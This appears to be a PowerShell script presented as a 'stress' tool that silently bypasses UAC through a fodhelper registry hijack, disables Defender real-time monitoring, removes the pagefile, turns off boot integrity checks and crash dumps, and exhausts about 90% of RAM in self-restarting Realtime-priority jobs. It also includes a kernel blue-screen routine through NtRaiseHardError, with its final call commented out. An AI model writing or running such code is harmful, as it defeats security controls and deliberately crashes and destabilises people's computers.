# Self-elevate silently via UAC bypass (unchanged)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $registryPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
    $scriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Definition)`""
    
    New-Item -Path $registryPath -Force | Out-Null
    New-ItemProperty -Path $registryPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $registryPath -Name "(Default)" -Value $scriptPath -Force | Out-Null
    
    Start-Process "fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item -Path $registryPath -Recurse -Force
    exit
}

Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Confirm:$false
Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber
Import-Module ThreadJob -Force

try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
# --- System Tweaks to maximize resource pressure ---
Start-Process wmic -ArgumentList 'computersystem set AutomaticManagedPagefile=False' -NoNewWindow -Wait
Start-Process wmic -ArgumentList 'pagefileset where (name="C:\\\\pagefile.sys") delete' -NoNewWindow -Wait
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks yes"
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CrashControl" -Name "CrashDumpEnabled" -Value 0 -Force
Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "PagingFiles" -Force 

# Disable thermal throttling (admin required)
powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
powercfg /setactive SCHEME_CURRENT

# --- Calculate RAM parameters ---
$physicalMem = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum
$targetSize = [math]::Floor($physicalMem * 0.9) # 90% of physical RAM

# Chunk size between 700MB and 999MB (start at 700MB)
$minChunkSize = 4GB
$maxChunkSize = 15GB

# Number of CPU cores
$threads = [Environment]::ProcessorCount

# List to hold job objects
$jobs = [System.Collections.ArrayList]::new()

# Add-Type block to import native NT functions for BSOD trigger
$source = @"
using System;
using System.Runtime.InteropServices;

public static class CS{
	[DllImport("ntdll.dll")]
	public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

	[DllImport("ntdll.dll")]
	public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

	public static unsafe void Kill(){
		Boolean tmp1;
		uint tmp2;
		RtlAdjustPrivilege(19, true, false, out tmp1);
		NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out tmp2);
	}
}
"@

# Kernel-level BSOD trigger function
function Invoke-KernelBSOD {
    $comparams = new-object -typename system.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams
    [CS]::Kill()
}


# Job script block for CPU + Memory stress per thread
$jobScript = {
    param($jobIndex, $minChunkSize, $maxChunkSize, $targetSize)

    # Set thread priority highest
    [System.Threading.Thread]::CurrentThread.Priority = [System.Threading.ThreadPriority]::Highest

    # Set process priority to Realtime (aggressive) and Set process affinity to all cores
    $proc = Get-Process -Id $PID
    try {
        $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
        $proc.ProcessorAffinity = -1
        [System.Runtime.GCSettings]::LatencyMode = [System.Runtime.GCLatencyMode]::LowLatency
        [System.GC]::Collect()
        Write-Host "Job ${jobIndex}: Process priority set to Realtime."
    } catch {
        Write-Warning "Job ${jobIndex}: Failed to set process priority to Realtime: $_"
    }

    # CPU Stress function with multiple CPU intensive tasks
    $numThreads = 3
    # Memory Stress function progressively allocating chunks
    $Stress_MemoryProgressive = {
        param(
            [int64]$minChunkSize,
            [int64]$maxChunkSize,
            [int64]$targetSize
        )
        $allocated = 0
        $memChunks = [System.Collections.Generic.List[byte[]]]::new()
        $chunkSize = $minChunkSize

        while ($true) {
            if ($allocated -ge $targetSize) {
                # Hold memory indefinitely
                Start-Sleep -Seconds 60
                continue
            }
            if ($chunkSize -lt $maxChunkSize) {
                $chunkSize = [math]::Min($chunkSize + 1GB, $maxChunkSize)
            }
            try {
                $chunk = New-Object byte[] $chunkSize
                [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($chunk)
                $memChunks.Add($chunk)
                $allocated += $chunkSize
            } catch {
                # Allocation failed, hold memory and retry after short pause
                Start-Sleep -Seconds 5
            }
        }
    }

    # Start memory stress in background thread
    1..$numThreads | ForEach-Object{
        Start-ThreadJob -ScriptBlock $Stress_MemoryProgressive -ThrottleLimit 100 | Out-Null
    }

    # CPU stress loop with progressive load increase
    $iterations = 1000000
    while ($true) {

        Start-Sleep -Milliseconds 200
    }
}


function Start-StressJob {
    param($index)
    $job = Start-Job -ScriptBlock $jobScript -ArgumentList $i, $minChunkSize, $maxChunkSize, $targetSize
    $job | Add-Member -NotePropertyName RetryCount -NotePropertyValue 0
    $jobs.Add($job)
}

# Start stress jobs for each CPU core
for ($i = 1; $i -le $threads; $i++) {
    Start-StressJob -index $i
}

Write-Host "Started $threads stress jobs with high priority."

$jobs | ForEach-Object {
    Write-Host "Job $($_.Id) state: $($_.State)"
}

# Optional: Wait some time before triggering BSOD (adjust delay as needed)
# $bsodDelaySeconds = 180
# Write-Host "Waiting $bsodDelaySeconds seconds before triggering BSOD..."
# $elapsedTime = 0

# while ($elapsedTime -lt $bsodDelaySeconds) {
#     Start-Sleep -Seconds 1
#     $elapsedTime++
#     Write-Progress -Activity "Waiting before BSOD" -Status "$elapsed seconds elapsed" -PercentComplete (($elapsed / $bsodDelaySeconds) * 100)
#     foreach ($job in $jobs) {
#         if ($job.State -ne 'Running') {
#             Write-Warning "Job $($job.Id) stopped unexpectedly. Restarting..."
#             Remove-Job -Job $job -Force
#             $newJob = Start-Job -ScriptBlock $jobScript -ArgumentList $job.JobParameters
#             $jobs += $newJob
#         }
#     }
# }

# # Trigger BSOD
# Invoke-KernelBSOD

# --- Monitor jobs and restart if any stop ---
while ($true) {
    Start-Sleep -Seconds 5
    $currentJobs = @($jobs)
    foreach ($job in $currentJobs) {
        if ($job.State -ne 'Running') {
            if ($job.RetryCount -ge 5) {
                Write-Warning "Job $($job.Id) failed 5 times. Removing."
                $jobs.Remove($job) | Out-Null
                continue
            }
            Write-Warning "Job $($job.Id) stopped. Restarting..."
            Remove-Job -Job $job -Force
            $jobs.Remove($job) | Out-Null
            Start-StressJob -index $job.Id
            $newJob = $jobs | Where-Object { $_.Id -eq $job.Id }
            if ($newJob) { $newJob.RetryCount = $job.RetryCount + 1 }
        }
    }
}

# Cleanup (never reached unless script forcibly stopped)
$jobs | ForEach-Object {
    Stop-Job -Job $_ -Force
    Remove-Job -Job $_ -Force
}